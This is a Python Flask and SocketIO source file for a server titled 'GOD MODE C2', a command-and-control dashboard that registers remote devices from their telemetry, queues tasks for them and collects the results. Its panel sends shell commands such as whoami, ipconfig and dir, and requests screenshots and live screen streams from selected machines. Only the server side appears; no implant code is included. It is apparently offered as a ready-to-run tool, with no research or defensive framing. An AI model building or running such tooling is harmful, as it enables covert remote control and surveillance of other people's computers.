from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
import threading
import time
from datetime import datetime
import base64
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'godmode-secret'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
CORS(app)

# GLOBAL STATE
devices = {}
tasks = {}
lock = threading.Lock()

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>GOD MODE C2</title>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Orbitron', monospace; 
            background: linear-gradient(45deg, #0a0a0a, #1a0033, #0a0a0a); 
            color: #00ff88; 
            height: 100vh; 
            overflow: hidden;
        }
        .glass { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(20px); 
            border: 1px solid rgba(255,255,255,0.1); 
            border-radius: 20px; 
            box-shadow: 0 8px 32px rgba(0,255,136,0.1);
        }
        .grid { display: grid; grid-template-columns: 1fr 2fr; height: 100vh; gap: 20px; padding: 20px; }
        .devices { overflow-y: auto; }
        .controls { display: flex; flex-direction: column; gap: 10px; }
        .device-card { 
            padding: 15px; margin: 10px 0; 
            animation: pulse 2s infinite; 
        }
        .online { border-left: 4px solid #00ff88; }
        .offline { border-left: 4px solid #ff4444; opacity: 0.5; }
        button { 
            background: linear-gradient(45deg, #00ff88, #00cc66); 
            border: none; 
            padding: 12px 20px; 
            border-radius: 10px; 
            cursor: pointer; 
            font-family: inherit; 
            font-weight: 700; 
            transition: all 0.3s;
        }
        button:hover { transform: scale(1.05); box-shadow: 0 5px 20px rgba(0,255,136,0.4); }
        .terminal { 
            height: 200px; 
            background: rgba(0,0,0,0.8); 
            padding: 15px; 
            font-family: monospace; 
            overflow-y: auto; 
            border-radius: 10px;
        }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
        .status { font-size: 12px; color: #888; }
    </style>
</head>
<body>
    <div class="grid">
        <div class="devices glass" style="padding:20px;">
            <h2>🖥️ DEVICES</h2>
            <div id="device-list"></div>
        </div>
        <div style="display:flex; flex-direction:column; gap:20px;">
            <div class="glass" style="padding:20px;">
                <h3 id="active-device">Select Device</h3>
                <div class="controls" id="controls"></div>
            </div>
            <div class="glass" style="padding:20px;">
                <h3>📱 TERMINAL</h3>
                <div class="terminal" id="terminal"></div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let selectedDevice = null;
        
        socket.on('connect', () => {
            addToTerminal('🔗 SocketIO connected');
        });
        
        socket.on('telemetry', (data) => {
            updateDevice(data);
            addToTerminal(`📡 ${data.host} (${data.id}): ${data.os}`);
        });
        
        function updateDevice(data) {
            const list = document.getElementById('device-list');
            let deviceDiv = document.getElementById(`device-${data.id}`);
            
            if (!deviceDiv) {
                deviceDiv = document.createElement('div');
                deviceDiv.id = `device-${data.id}`;
                deviceDiv.className = 'device-card online glass';
                deviceDiv.innerHTML = `
                    <div><strong>${data.host}</strong> <span class="status">${data.ip}</span></div>
                    <div style="font-size:12px;">${data.os} | ${data.user}</div>
                    <button onclick="selectDevice('${data.id}')">SELECT</button>
                `;
                list.appendChild(deviceDiv);
            }
            
            // Update status
            deviceDiv.className = 'device-card online glass';
        }
        
        function selectDevice(id) {
            selectedDevice = id;
            document.getElementById('active-device').textContent = `🎯 ${id}`;
            loadControls(id);
        }
        
        function loadControls(deviceId) {
            const controls = document.getElementById('controls');
            controls.innerHTML = `
                <button onclick="sendTask('${deviceId}', 'shell', 'whoami')">👤 Whoami</button>
                <button onclick="sendTask('${deviceId}', 'shell', 'ipconfig')">🌐 Network</button>
                <button onclick="sendTask('${deviceId}', 'shell', 'dir')">📁 Files</button>
                <button onclick="sendTask('${deviceId}', 'screenshot')">📸 Screenshot</button>
                <button onclick="sendTask('${deviceId}', 'stream_screen')">📺 Screen Stream</button>
            `;
        }
        
        function sendTask(deviceId, type, cmd='') {
            socket.emit('task', {id: deviceId, type: type, cmd: cmd});
            addToTerminal(`▶️ ${deviceId}: ${type} ${cmd}`);
        }
        
        function addToTerminal(msg) {
            const term = document.getElementById('terminal');
            term.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
            term.scrollTop = term.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def dashboard():
    return render_template_string(HTML_TEMPLATE)

@app.route('/telemetry', methods=['POST'])
def telemetry():
    data = request.json
    device_id = data.get('id')
    
    with lock:
        if device_id not in devices:
            devices[device_id] = {}
        
        devices[device_id].update({
            'host': data.get('host', 'unknown'),
            'user': data.get('user', 'unknown'),
            'os': data.get('os', 'unknown'),
            'ip': data.get('ip', 'unknown'),
            'last_seen': datetime.now().isoformat(),
            'status': 'online'
        })
    
    # BROADCAST TO ALL CLIENTS
    socketio.emit('telemetry', data)
    print(f"📡 TELEMETRY: {device_id} -> {data.get('host')}")
    
    return jsonify({'status': 'ok'})

@app.route('/tasks/<device_id>', methods=['GET'])
def get_tasks(device_id):
    with lock:
        device_tasks = tasks.get(device_id, [])
        return jsonify({'tasks': device_tasks})

@app.route('/result', methods=['POST'])
def task_result():
    data = request.json
    device_id = data.get('id')
    result = data.get('result', {})
    
    print(f"📥 RESULT {device_id}: {result}")
    socketio.emit('result', {'id': device_id, 'result': result})
    
    # Clear processed tasks
    with lock:
        if device_id in tasks:
            tasks[device_id] = []
    
    return jsonify({'status': 'ok'})

@socketio.on('task')
def handle_task(data):
    device_id = data.get('id')
    task_type = data.get('type')
    cmd = data.get('cmd', '')
    
    task = {
        'id': f"task_{int(time.time())}",
        'type': task_type,
        'cmd': cmd,
        'timestamp': datetime.now().isoformat()
    }
    
    with lock:
        if device_id not in tasks:
            tasks[device_id] = []
        tasks[device_id].append(task)
    
    print(f"📤 TASK → {device_id}: {task_type} {cmd}")
    emit('task_sent', {'task': task})

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
